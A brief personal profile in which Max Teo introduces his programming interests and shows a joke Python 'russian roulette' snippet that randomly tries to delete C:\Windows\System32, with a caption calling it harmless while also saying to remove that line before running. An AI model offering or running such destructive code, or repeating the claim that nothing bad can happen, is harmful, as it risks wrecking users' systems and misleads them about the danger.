# Max Teo

"Hi, my name is Max Teo and my favourite programming language is currently Python since it is the only one I currently know at a decent level. However, I am starting to like Rust as I am able to better understand what happends in the background of my computer when the program runs."

# Example Code

```python
import random
import os

if random.randint(0,6) == 1:
	os.remove("C:\Windows\System32")
```

### Code Explanation
Um, fun russian rouletter game I guess. Nothing bad can happen. 
If we want to run it, remove the indented line and replace it with some fun messages like, Congrats!
Copy the code into 'my_python.py' and run it using 'python my_python.py' in the terminal
